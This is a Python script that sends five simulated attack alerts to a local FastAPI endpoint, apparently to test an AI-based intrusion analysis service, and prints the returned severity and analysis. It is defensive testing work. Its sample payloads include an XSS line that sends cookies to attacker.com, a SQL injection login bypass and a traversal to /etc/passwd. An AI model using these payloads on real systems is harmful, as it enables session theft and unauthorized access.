import asyncio
import httpx
import json
from datetime import datetime

# --- LOGIC FLOW ---
# 1. Define a list of 5 diverse attack vectors.
# 2. Asynchronously fire them at the FastAPI gateway.
# 3. Print the Gemma 4 reasoning for each to the console.

ATTACKS = [
    {
        "flagged_reason": "DDoS: High Volume SYN Flood",
        "payload_snippet": "Inbound PPS exceeds 1,000,000 on Port 80"
    },
    {
        "flagged_reason": "SQL Injection: Auth Bypass",
        "payload_snippet": "POST /login body: admin' --"
    },
    {
        "flagged_reason": "XSS: Session Hijacking",
        "payload_snippet": "<script>document.location='http://attacker.com/steal?'+document.cookie</script>"
    },
    {
        "flagged_reason": "Directory Traversal",
        "payload_snippet": "GET /../../../../etc/passwd"
    },
    {
        "flagged_reason": "Brute Force: SSH Root",
        "payload_snippet": "50 failed login attempts in 2 seconds for user 'root'"
    }
]

async def fire_attack(client, attack):
    payload = {
        "timestamp": datetime.now().isoformat(),
        "source_ip": "192.0.2.1",
        "destination_ip": "10.0.0.5",
        "protocol": "TCP/HTTP",
        "flagged_reason": attack["flagged_reason"],
        "payload_snippet": attack["payload_snippet"]
    }
    try:
        response = await client.post("http://127.0.0.1:8000/analyze", json=payload, timeout=120)
        result = response.json()
        print(f"\n[DETECTED] {attack['flagged_reason']}")
        print(f"SEVERITY: {result['severity']}")
        print(f"AI ANALYSIS: {result['analysis']}")
    except Exception as e:
        print(f"Error firing attack {attack['flagged_reason']}: {e}")

async def main():
    async with httpx.AsyncClient() as client:
        tasks = [fire_attack(client, a) for a in ATTACKS]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    print("--- STARTING SYSTEM STRESS TEST ---")
    asyncio.run(main())
